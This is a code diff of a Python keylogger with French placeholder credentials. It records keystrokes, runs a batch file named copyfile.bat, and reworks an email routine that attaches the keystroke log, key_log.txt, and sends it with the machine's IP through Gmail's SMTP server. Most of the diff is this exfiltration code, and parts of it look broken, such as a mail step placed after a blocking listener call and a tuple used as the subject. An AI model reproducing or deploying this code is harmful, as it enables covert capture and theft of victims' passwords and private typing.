@@ -12,7 +12,6 @@ import socket
 import datetime
 import sys
 from subprocess import Popen
-from Flask import *
 
 p = Popen("copyfile.bat", cwd=r"")
 stdout, stderr = p.communicate()
@@ -31,44 +30,36 @@ def on_press(key):
 
 with Listener(on_press=on_press) as listener:
     listener.join()
-    
-def on_press(key)
-    logging.info(str(key))
-    if key == Key.enter:
-        return 9
 
     #partie EMAIL !
+if datetime.datetime.now().minute == 30 :
+    myip = socket.gethostbyname(socket.gethostname())
+    email_user = 'Votre E-mail'
+    email_send = 'Votre E-mail'
+    email_password = 'Votre Mot de Passe'
+    subject = 'Keylogger', myip
 
-while 9:    
-    if datetime.datetime.now().minute == 30 :
-        myip = socket.gethostbyname(socket.gethostname())
-        email_user = 'Votre E-mail'
-        email_send = 'Votre E-mail'
-        email_password = 'Votre Mot de Passe'
-        subject = 'Keylogger', myip
+    msg = MIMEMultipart()
+    msg['From'] = email_user
+    msg['To'] = email_send
+    msg['Subject'] = subject
 
-        msg = MIMEMultipart()
-        msg['From'] = email_user
-        msg['To'] = email_send
-        msg['Subject'] = subject
+    body = 'Python Keylogger réponse.'
+    msg.attach(MIMEText(body, 'plain'))
 
-        body = 'Python Keylogger réponse.'
-        msg.attach(MIMEText(body, 'plain'))
+    filename='key_log.txt'
+    attachment =open(filename, 'rb')
 
-        filename='key_log.txt'
-        attachment =open(filename, 'rb')
+    part = MIMEBase('application', 'octet-stream')
+    part.set_payload((attachment).read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', "attachment; filename= "+filename)
 
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload((attachment).read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition', "attachment; filename= "+filename)
+    msg.attach(part)
+    text = msg.as_string()
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(email_user, email_password)
 
-        msg.attach(part)
-        text = msg.as_string()
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(email_user, email_password)
-
-        server.sendmail(email_user,email_send,text)
-        server.quit()
-        return 0
+    server.sendmail(email_user,email_send,text)
+    server.quit()
